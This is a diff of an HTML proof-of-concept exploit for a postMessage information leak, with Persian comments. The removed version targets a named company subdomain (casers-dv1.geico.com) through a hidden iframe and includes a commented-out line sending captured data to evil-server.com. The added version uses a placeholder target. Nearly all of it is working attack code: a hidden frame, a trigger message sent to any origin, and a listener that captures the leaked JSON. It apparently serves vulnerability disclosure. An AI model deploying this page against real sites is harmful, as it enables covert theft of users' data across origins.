@@ -1,50 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC - Information Disclosure via postMessage</title>
+    <title>PoC - Information Leakage via PostMessage</title>
 </head>
 <body>
-    <h2>🎣 اکسپلویت نشت اطلاعات از طریق postMessage 🎣</h2>
-    <p>لطفاً کنسول مرورگر (F12) را بررسی کنید تا داده‌های دزدیده شده را ببینید.</p>
+    <h2>اثبات آسیب‌پذیری نشت اطلاعات - لطفا کنسول را چک کنید</h2>
+    <p>اگر پیام JSON در کنسول دریافت شد، نشت اطلاعات با موفقیت انجام شده است.</p>
     
-    <iframe id="victimFrame" src="https://casers-dv1.geico.com/" style="width:1px; height:1px; border:none; visibility:hidden;"></iframe>
+    <iframe id="victimFrame" src="https://VULNERABLE-SITE.COM/path/to/vulnerable-page.html" style="width:1px; height:1px; border:none; visibility:hidden;"></iframe>
 
     <script>
-        // آدرس iFrame هدف را در متغیر victim ذخیره می‌کنیم
         var victim = document.getElementById("victimFrame").contentWindow;
 
-        // --- ۱. راه اندازی شنود کننده برای دریافت اطلاعات دزدیده شده ---
+        // شنود کننده برای دریافت هرگونه پیام ارسالی از iFrame
         window.addEventListener("message", function(event) {
             
-            // ما انتظار داریم Origin ما مورد حمله قرار گیرد، اما برای نمایش خوب است
-            // که همه چیز را لاگ کنیم.
-            console.log("--- پیام دزدیده شده (Captured Message) ---");
-            console.log("Origin فرستنده (احتمالاً سایت قربانی):", event.origin);
+            console.log("--- پیام دریافتی (Captured Message) ---");
+            console.log("Origin فرستنده:", event.origin);
             
             try {
-                // نمایش اطلاعات حساس
                 var stolenData = JSON.parse(event.data);
-                console.log("✅ اطلاعات حساس دزدیده شده (JSON):", stolenData);
-                alert("SUCCESS! Data Stolen:\n" + event.data);
                 
-                // در یک حمله واقعی، اطلاعات به سرور مهاجم ارسال می‌شود
-                // fetch('https://evil-server.com/log?data=' + encodeURIComponent(event.data));
-
+                // 💥 این قسمت داده‌های نشت شده (مانند eventID) را نمایش می‌دهد 💥
+                console.log("✅ داده‌های حساس نشت شده:", stolenData);
+                alert("Data Leak Success! Check Console for JSON Payload.");
+                
             } catch (e) {
-                console.log("Received non-JSON data or unexpected format.");
+                console.warn("Received non-JSON data or unexpected format.");
             }
         });
 
-        // --- ۲. ارسال پیام ماشه‌کش (Trigger) برای شروع حمله ---
+        // ارسال پیام ماشه‌کش (Trigger) برای مجبور کردن iFrame به ارسال پاسخ
         document.getElementById("victimFrame").onload = function() {
-            console.log("هدف لود شد. ارسال پیام ماشه‌کش...");
+            console.log("Target loaded, sending trigger...");
             
             // این Payload دقیقاً همان چیزی است که کد آسیب‌پذیر انتظار دارد
             var triggerPayload = JSON.stringify({ action: "Initialized" });
             
-            // ما پیام را به iFrame ارسال می‌کنیم. استفاده از '*' در اینجا برای مهاجم مشکلی ندارد.
+            // پیام به iFrame ارسال می‌شود
             victim.postMessage(triggerPayload, "*"); 
-            console.log("Payload ارسال شد.");
+            console.log("Trigger Payload sent.");
         };
     </script>
 </body>
